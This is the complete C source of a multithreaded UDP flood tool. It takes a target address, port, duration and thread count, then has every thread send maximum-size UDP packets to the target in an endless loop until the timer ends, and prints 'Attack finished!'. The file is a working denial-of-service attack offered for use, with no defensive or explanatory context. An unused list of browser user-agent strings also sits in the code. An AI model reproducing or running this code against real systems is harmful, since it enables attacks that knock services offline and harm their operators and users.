#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MAX_THREADS 1000
#define PACKET_SIZE 65507

char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    // Add more user agents as needed
};

typedef struct {
    char *target;
    int port;
    int duration;
    int threads;
} AttackParams;

void *attack(void *arg) {
    AttackParams *params = (AttackParams *)arg;

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->port);
    dest_addr.sin_addr.s_addr = inet_addr(params->target);

    char request[PACKET_SIZE];
    memset(request, 'A', sizeof(request)); // Fill packet with 'A's

    int sock;
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    while (1) {
        if (sendto(sock, request, PACKET_SIZE, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Failed to send packet");
            exit(EXIT_FAILURE);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s target port duration threads\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t thread_ids[MAX_THREADS];
    AttackParams params = {target, port, duration, threads};

    for (int i = 0; i < threads; ++i) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&params) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    sleep(duration);

    for (int i = 0; i < threads; ++i) {
        pthread_cancel(thread_ids[i]);
    }

    printf("Attack finished!\n");

    return 0;
}
